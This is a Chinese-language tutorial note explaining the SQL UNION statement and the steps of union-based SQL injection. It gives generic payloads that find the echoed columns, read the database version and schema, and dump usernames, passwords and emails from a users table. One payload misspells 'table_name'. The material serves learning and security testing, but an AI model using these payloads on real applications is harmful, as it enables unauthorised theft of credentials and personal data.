##### Union语句

1. union语句的作用

   union的语句的作用是将多个select语句的查询结果集合并为一个结果集，结果集的列名取第一个select语句的列名

2. union语句的使用条件

   每个SELECT语句的相应位置中列出的所选列应具有相同的数据类型。例如，第一条语句选择的第一列应与其他语句选择的第一列具有相同的类型。如果相应的SELECT列的数据类型不匹配，则UNION结果中的列的类型和长度将考虑所有SELECT语句检索到的值。例如，考虑以下情况，其中列长度不限于第一个SELECT的值的长度

   ```sql
   mysql> SELECT REPEAT('a',1) UNION SELECT REPEAT('b',20);
   +----------------------+
   | REPEAT('a',1)        |
   +----------------------+
   | a                    |
   | bbbbbbbbbbbbbbbbbbbb |
   +----------------------+
   ```

   

##### Union注入一般步骤

1. 确定回显位。一般可以用如下两个方法来判断回显位

   ```sql
   # 使用select语句, 对应的sql payload如下
   xxx' union select 1,2,3 --+
   
   # 使用order by, 对应的sql payload如下
   xxx' order by 1,2,3 --+
   ```

2. 确定数据库版本，当前应用程序使用的数据库名

   ```sql
   # @@version, user(), database(), 对应sql payload如下
   
   xxx' union select @@version, user(), database() --+
   ```

3. 查询数据表

   ```sql
   # 数据表information_schema.tables, table_name, table_schema, 对应的sql payload如下
   
   xxx' union select table_name, table_schema, 3 from information_schema.tables where table_schema = database() --+
   ```

4. 确定表字段

   ```sql
   # information_schema.columns, table_name, column_name, 对应的sql payload如下
   
   xxx' union select talbe_name, column_name, 3 from information_schema.columns where table_name = "users" --+
   ```

5.  查询数据

   ```sql
   # 在知道库名，表名，字段名后之后的操作就跟普通的查询没什么区别了
   
   xxx' union select username, password, email from users --+
   ```



##### Union 注入小总结

1. 使用union注入需要注意的是多个select语句中的的列的数目，数据类型要相同。
2. 使用union注入需要有明显的回显位。





---

that's all





